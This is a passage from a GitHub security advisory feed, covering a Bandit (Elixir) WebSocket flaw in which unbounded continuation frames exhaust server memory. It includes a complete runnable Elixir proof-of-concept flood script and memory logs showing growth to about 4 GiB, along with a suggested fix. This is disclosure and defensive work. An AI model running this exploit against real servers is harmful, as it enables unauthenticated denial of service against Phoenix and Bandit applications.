<li><a href="https://github.com/mtrudel/bandit/commit/f2ca636eb6df385219957e8934e9fc6efa1630d1">https://github.com/mtrudel/bandit/commit/f2ca636eb6df385219957e8934e9fc6efa1630d1</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-39805.html">https://cna.erlef.org/cves/CVE-2026-39805.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-39805">https://osv.dev/vulnerability/EEF-CVE-2026-39805</a></li>
<li><a href="https://github.com/advisories/GHSA-c67r-gc9j-2qf7">https://github.com/advisories/GHSA-c67r-gc9j-2qf7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c67r-gc9j-2qf7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-07T03:46:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bandit] Bandit Buffers Unbounded WebSocket Continuation Frames, Allowing Unauthenticated Memory Exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-pf94-94m9-536p</id>
        <link href="https://github.com/advisories/GHSA-pf94-94m9-536p"/>
        <updated>2026-05-07T03:43:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A single unauthenticated WebSocket client can exhaust server memory in any Bandit-fronted application that accepts WebSocket connections. The fragmented-message reassembly path appends every <code>Continuation{fin: false}</code> frame's payload to a per-connection iolist with no cumulative size cap, so a peer that streams continuation frames indefinitely (never setting <code>fin=1</code>) grows BEAM heap linearly until the OS or a supervisor kills the process. <code>max_frame_size</code> only bounds individual frames; there is no <code>max_message_size</code> option available today.</p>
<h3 id="details">Details</h3>
<p>The bug is in <code>lib/bandit/websocket/connection.ex</code>, in the fragment branch of <code>handle_frame/3</code> (around lines 80–95). When a non-final continuation arrives, Bandit builds the next accumulator as <code>[connection.fragment_frame.data | frame.data]</code> with no running byte-count check. A peer can therefore stream max-sized continuations forever and grow BEAM resident memory without bound. When <code>fin=1</code> finally arrives (if ever), <code>IO.iodata_to_binary/1</code> flattens the whole iolist, briefly doubling peak memory. The attacker does not need to send <code>fin=1</code> — simply holding the connection open is enough to pin the bytes.</p>
<p><strong>Suggested fix:</strong> track a running cumulative byte count on the connection state and add a configurable <code>max_message_size</code>. When exceeded, terminate the connection with RFC 6455 close code 1009 (<code>:max_message_size_exceeded</code>) instead of continuing to append.</p>
<h3 id="poc">PoC</h3>
<p>A self-contained reproduction script is below. It starts Bandit 1.10 on <code>127.0.0.1:4321</code> with a trivial <code>WebSock</code> echo handler, completes a WebSocket handshake, sends one text frame with <code>fin=0</code>, then streams up to 4096 continuation frames of 1 MiB each — also <code>fin=0</code>. A background sampler logs <code>:erlang.memory(:total)</code> every 250 ms.</p>
<p>A correctly-fixed server would close the connection with code 1009 once <code>max_message_size</code> is exceeded.</p>
<h3 id="impact">Impact</h3>
<p>Unauthenticated DoS via memory exhaustion. A single connection can drive BEAM heap to gigabytes; a small number of concurrent connections OOM-kills the host.</p>
<p><strong>Affected by default.</strong> No opt-in flag, no configuration option to mitigate. Any Phoenix application is on the vulnerable path: Phoenix Channels and LiveView both run over <code>WebSock</code> on Bandit, so a stock Phoenix app exposes this surface as soon as it accepts socket connections — including the LiveView socket that almost every Phoenix 1.7+ app mounts at <code>/live</code>. Plug apps that mount any custom <code>WebSock</code> handler are equally affected. Applications that expose no WebSocket endpoints are not.</p>
<p>The exploit also survives almost every common deployment topology: L4 load balancers, HTTP-mode reverse proxies, and TLS-terminating edge proxies (Cloudflare, Fly.io, Fastly, etc.) all tunnel post-upgrade WebSocket frames opaquely without inspecting size. There is no application-level workaround either — the accumulation happens <em>before</em> <code>WebSock.handle_in/2</code> is called, so by the time the application could check, Bandit has already buffered the iolist. The fix belongs in Bandit.</p>
<h3 id="script-and-logs">Script and Logs</h3>
<pre><code class="language-elixir"># Bandit WebSocket fragmented-message accumulation PoC.
#
# lib/bandit/websocket/connection.ex:80-95 appends every incoming
# Continuation{fin: false} frame's payload to connection.fragment_frame.data
# as iodata, with no cumulative cap. `max_frame_size` only bounds *each*
# frame; a peer that streams an unbounded number of max-sized continuations
# without ever setting fin=1 grows the iolist linearly in BEAM memory until
# the OS kills the process. The eventual IO.iodata_to_binary/1 in the
# fin=true branch also momentarily doubles peak memory.
#
# This script starts Bandit 1.10 on 127.0.0.1:4321, opens a WebSocket,
# sends one text frame with fin=0 followed by a continuous stream of
# continuation frames (also fin=0), and samples BEAM memory while doing so.
# A correct server would close the connection with 1009 once a configured
# max-message-size is exceeded; the buggy server keeps growing.
#
# Run: elixir scripts/bandit/ws_fragment_memory_exhaustion.exs

Mix.install([
  {:bandit, "~&gt; 1.10"},
  {:plug, "~&gt; 1.19"},
  {:websock_adapter, "~&gt; 0.5"}
])

defmodule EchoSocket do
  @behaviour WebSock

  def init(_opts), do: {:ok, %{}}
  def handle_in(_message, state), do: {:ok, state}
  def handle_info(_message, state), do: {:ok, state}
  def terminate(_reason, state), do: {:ok, state}
end

defmodule DemoApp do
  @behaviour Plug
  def init(opts), do: opts

  def call(conn, _opts) do
    conn
    |&gt; WebSockAdapter.upgrade(EchoSocket, %{}, [])
    |&gt; Plug.Conn.halt()
  end
end

defmodule FragmentFlood do
  @port 4321
  @fragment_payload_bytes 1 * 1024 * 1024
  @fragment_count 4096
  @sample_every_ms 250

  def run do
    {:ok, _} = Bandit.start_link(plug: DemoApp, ip: {127, 0, 0, 1}, port: @port)

    sock = ws_handshake!()
    sampler_pid = spawn_link(&amp;sample_memory_loop/0)

    payload_chunk = :binary.copy(&lt;&lt;0x41&gt;&gt;, @fragment_payload_bytes)
    starting_text_frame = build_frame(0x1, _fin = false, payload_chunk)
    continuation_frame = build_frame(0x0, _fin = false, payload_chunk)

    log("Sending start text frame (fin=0, #{@fragment_payload_bytes} bytes).")
    :ok = :gen_tcp.send(sock, starting_text_frame)

    log("Streaming #{@fragment_count} continuation frames (fin=0, #{@fragment_payload_bytes} bytes each).")
    Enum.each(1..@fragment_count, fn index -&gt;
      case :gen_tcp.send(sock, continuation_frame) do
        :ok -&gt;
          if rem(index, 64) == 0 do
            log("Sent #{index}/#{@fragment_count} continuations (~#{div(index * @fragment_payload_bytes, 1024 * 1024)} MiB accumulated).")
          end

        {:error, reason} -&gt;
          log("Server closed connection after #{index} continuations: #{inspect(reason)}")
          throw(:server_closed)
      end
    end)

    log("Finished sending. Never sent fin=1 — server should still be holding the iolist.")
    Process.sleep(2_000)

    Process.unlink(sampler_pid)
    Process.exit(sampler_pid, :kill)
    :gen_tcp.close(sock)
    log("Done.")
  catch
    :server_closed -&gt; log("Server appears to enforce a cap — bug not present or mitigated.")
  end

  defp ws_handshake! do
    {:ok, sock} = :gen_tcp.connect(~c"127.0.0.1", @port, [:binary, active: false])
    ws_key = :crypto.strong_rand_bytes(16) |&gt; Base.encode64()

    :ok =
      :gen_tcp.send(sock, """
      GET / HTTP/1.1\r
      Host: 127.0.0.1\r
      Upgrade: websocket\r
      Connection: Upgrade\r
      Sec-WebSocket-Key: #{ws_key}\r
      Sec-WebSocket-Version: 13\r
      \r
      """)

    {:ok, response} = :gen_tcp.recv(sock, 0, 5_000)
    if not (response =~ "101 Switching Protocols"), do: raise("WebSocket handshake failed:\n#{response}")
    log("Handshake complete.")
    sock
  end

  # Build a single masked WebSocket frame. fin controls bit 0 of byte 0;
  # opcode is the low nibble. Client→server frames must be masked per RFC 6455.
  defp build_frame(opcode, fin, payload) do
    fin_bit = if fin, do: 1, else: 0
    mask = :crypto.strong_rand_bytes(4)
    payload_size = byte_size(payload)
    mask_stream = binary_part(:binary.copy(mask, div(payload_size, 4) + 1), 0, payload_size)
    masked_payload = :crypto.exor(payload, mask_stream)

    length_bytes =
      cond do
        payload_size &lt;= 125 -&gt; &lt;&lt;1::1, payload_size::7&gt;&gt;
        payload_size &lt;= 0xFFFF -&gt; &lt;&lt;1::1, 126::7, payload_size::16&gt;&gt;
        true -&gt; &lt;&lt;1::1, 127::7, payload_size::64&gt;&gt;
      end

    &lt;&lt;fin_bit::1, 0::3, opcode::4, length_bytes::binary, mask::binary, masked_payload::binary&gt;&gt;
  end

  defp sample_memory_loop do
    log("[mem] BEAM total = #{div(:erlang.memory(:total), 1_048_576)} MiB")
    Process.sleep(@sample_every_ms)
    sample_memory_loop()
  end

  defp log(message), do: IO.puts("[#{Time.utc_now() |&gt; Time.truncate(:millisecond)}] #{message}")
end

FragmentFlood.run()
</code></pre>
<pre><code class="language-logs">13:04:30.778 [info] Running DemoApp with Bandit 1.10.4 at 127.0.0.1:4321 (http)
[11:04:30.812] Handshake complete.
[11:04:30.815] [mem] BEAM total = 49 MiB
[11:04:30.823] Sending start text frame (fin=0, 1048576 bytes).
[11:04:30.824] Streaming 4096 continuation frames (fin=0, 1048576 bytes each).
[11:04:30.940] Sent 64/4096 continuations (~64 MiB accumulated).
[11:04:31.055] Sent 128/4096 continuations (~128 MiB accumulated).
[11:04:31.065] [mem] BEAM total = 185 MiB
[11:04:31.169] Sent 192/4096 continuations (~192 MiB accumulated).
[11:04:31.285] Sent 256/4096 continuations (~256 MiB accumulated).
[11:04:31.316] [mem] BEAM total = 322 MiB
[11:04:31.404] Sent 320/4096 continuations (~320 MiB accumulated).
[11:04:31.518] Sent 384/4096 continuations (~384 MiB accumulated).
[11:04:31.567] [mem] BEAM total = 463 MiB
[11:04:31.633] Sent 448/4096 continuations (~448 MiB accumulated).
[11:04:31.747] Sent 512/4096 continuations (~512 MiB accumulated).
[11:04:31.818] [mem] BEAM total = 602 MiB
[11:04:31.866] Sent 576/4096 continuations (~576 MiB accumulated).
[11:04:31.979] Sent 640/4096 continuations (~640 MiB accumulated).
[11:04:32.069] [mem] BEAM total = 743 MiB
[11:04:32.091] Sent 704/4096 continuations (~704 MiB accumulated).
[11:04:32.199] Sent 768/4096 continuations (~768 MiB accumulated).
[11:04:32.306] Sent 832/4096 continuations (~832 MiB accumulated).
[11:04:32.320] [mem] BEAM total = 887 MiB
[11:04:32.420] Sent 896/4096 continuations (~896 MiB accumulated).
[11:04:32.530] Sent 960/4096 continuations (~960 MiB accumulated).
[11:04:32.571] [mem] BEAM total = 1034 MiB
[11:04:32.640] Sent 1024/4096 continuations (~1024 MiB accumulated).
[11:04:32.751] Sent 1088/4096 continuations (~1088 MiB accumulated).
[11:04:32.822] [mem] BEAM total = 1179 MiB
[11:04:32.866] Sent 1152/4096 continuations (~1152 MiB accumulated).
[11:04:32.977] Sent 1216/4096 continuations (~1216 MiB accumulated).
[11:04:33.073] [mem] BEAM total = 1323 MiB
[11:04:33.087] Sent 1280/4096 continuations (~1280 MiB accumulated).
[11:04:33.200] Sent 1344/4096 continuations (~1344 MiB accumulated).
[11:04:33.309] Sent 1408/4096 continuations (~1408 MiB accumulated).
[11:04:33.324] [mem] BEAM total = 1466 MiB
[11:04:33.421] Sent 1472/4096 continuations (~1472 MiB accumulated).
[11:04:33.533] Sent 1536/4096 continuations (~1536 MiB accumulated).
[11:04:33.575] [mem] BEAM total = 1608 MiB
[11:04:33.643] Sent 1600/4096 continuations (~1600 MiB accumulated).
[11:04:33.751] Sent 1664/4096 continuations (~1664 MiB accumulated).
[11:04:33.826] [mem] BEAM total = 1758 MiB
[11:04:33.860] Sent 1728/4096 continuations (~1728 MiB accumulated).
[11:04:33.972] Sent 1792/4096 continuations (~1792 MiB accumulated).
[11:04:34.077] [mem] BEAM total = 1901 MiB
[11:04:34.083] Sent 1856/4096 continuations (~1856 MiB accumulated).
[11:04:34.192] Sent 1920/4096 continuations (~1920 MiB accumulated).
[11:04:34.305] Sent 1984/4096 continuations (~1984 MiB accumulated).
[11:04:34.328] [mem] BEAM total = 2048 MiB
[11:04:34.417] Sent 2048/4096 continuations (~2048 MiB accumulated).
[11:04:34.528] Sent 2112/4096 continuations (~2112 MiB accumulated).
[11:04:34.579] [mem] BEAM total = 2191 MiB
[11:04:34.644] Sent 2176/4096 continuations (~2176 MiB accumulated).
[11:04:34.751] Sent 2240/4096 continuations (~2240 MiB accumulated).
[11:04:34.830] [mem] BEAM total = 2342 MiB
[11:04:34.863] Sent 2304/4096 continuations (~2304 MiB accumulated).
[11:04:34.974] Sent 2368/4096 continuations (~2368 MiB accumulated).
[11:04:35.081] [mem] BEAM total = 2480 MiB
[11:04:35.088] Sent 2432/4096 continuations (~2432 MiB accumulated).
[11:04:35.202] Sent 2496/4096 continuations (~2496 MiB accumulated).
[11:04:35.316] Sent 2560/4096 continuations (~2560 MiB accumulated).
[11:04:35.332] [mem] BEAM total = 2620 MiB
[11:04:35.430] Sent 2624/4096 continuations (~2624 MiB accumulated).
[11:04:35.545] Sent 2688/4096 continuations (~2688 MiB accumulated).
[11:04:35.583] [mem] BEAM total = 2760 MiB
[11:04:35.660] Sent 2752/4096 continuations (~2752 MiB accumulated).
[11:04:35.776] Sent 2816/4096 continuations (~2816 MiB accumulated).
[11:04:35.834] [mem] BEAM total = 2903 MiB
[11:04:35.890] Sent 2880/4096 continuations (~2880 MiB accumulated).
[11:04:36.000] Sent 2944/4096 continuations (~2944 MiB accumulated).
[11:04:36.085] [mem] BEAM total = 3045 MiB
[11:04:36.110] Sent 3008/4096 continuations (~3008 MiB accumulated).
[11:04:36.225] Sent 3072/4096 continuations (~3072 MiB accumulated).
[11:04:36.336] [mem] BEAM total = 3184 MiB
[11:04:36.343] Sent 3136/4096 continuations (~3136 MiB accumulated).
[11:04:36.462] Sent 3200/4096 continuations (~3200 MiB accumulated).
[11:04:36.580] Sent 3264/4096 continuations (~3264 MiB accumulated).
[11:04:36.587] [mem] BEAM total = 3332 MiB
[11:04:36.691] Sent 3328/4096 continuations (~3328 MiB accumulated).
[11:04:36.806] Sent 3392/4096 continuations (~3392 MiB accumulated).
[11:04:36.838] [mem] BEAM total = 3463 MiB
[11:04:36.927] Sent 3456/4096 continuations (~3456 MiB accumulated).
[11:04:37.041] Sent 3520/4096 continuations (~3520 MiB accumulated).
[11:04:37.089] [mem] BEAM total = 3610 MiB
[11:04:37.157] Sent 3584/4096 continuations (~3584 MiB accumulated).
[11:04:37.273] Sent 3648/4096 continuations (~3648 MiB accumulated).
[11:04:37.340] [mem] BEAM total = 3735 MiB
[11:04:37.389] Sent 3712/4096 continuations (~3712 MiB accumulated).
[11:04:37.504] Sent 3776/4096 continuations (~3776 MiB accumulated).
[11:04:37.591] [mem] BEAM total = 3878 MiB
[11:04:37.629] Sent 3840/4096 continuations (~3840 MiB accumulated).
[11:04:37.745] Sent 3904/4096 continuations (~3904 MiB accumulated).
[11:04:37.842] [mem] BEAM total = 4012 MiB
[11:04:37.862] Sent 3968/4096 continuations (~3968 MiB accumulated).
[11:04:37.982] Sent 4032/4096 continuations (~4032 MiB accumulated).
[11:04:38.093] [mem] BEAM total = 4142 MiB
[11:04:38.105] Sent 4096/4096 continuations (~4096 MiB accumulated).
[11:04:38.105] Finished sending. Never sent fin=1 — server should still be holding the iolist.
[11:04:38.344] [mem] BEAM total = 4149 MiB
[11:04:38.596] [mem] BEAM total = 4149 MiB
[11:04:38.847] [mem] BEAM total = 4149 MiB
[11:04:39.098] [mem] BEAM total = 4149 MiB
[11:04:39.349] [mem] BEAM total = 4149 MiB
[11:04:39.600] [mem] BEAM total = 4149 MiB
[11:04:39.851] [mem] BEAM total = 4149 MiB
[11:04:40.102] [mem] BEAM total = 4149 MiB
[11:04:40.106] Done.
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mtrudel/bandit/security/advisories/GHSA-pf94-94m9-536p">https://github.com/mtrudel/bandit/security/advisories/GHSA-pf94-94m9-536p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42786">https://nvd.nist.gov/vuln/detail/CVE-2026-42786</a></li>
<li><a href="https://github.com/mtrudel/bandit/commit/21612c7c7b1ce43eccd36d3af3a2299d23513667">https://github.com/mtrudel/bandit/commit/21612c7c7b1ce43eccd36d3af3a2299d23513667</a></li>
<li><a href="https://cna.erlef.org/cves/CVE-2026-42786.html">https://cna.erlef.org/cves/CVE-2026-42786.html</a></li>
<li><a href="https://osv.dev/vulnerability/EEF-CVE-2026-42786">https://osv.dev/vulnerability/EEF-CVE-2026-42786</a></li>
<li><a href="https://github.com/advisories/GHSA-pf94-94m9-536p">https://github.com/advisories/GHSA-pf94-94m9-536p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf94-94m9-536p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-07T03:43:45.000Z</published>
    </entry>
</feed>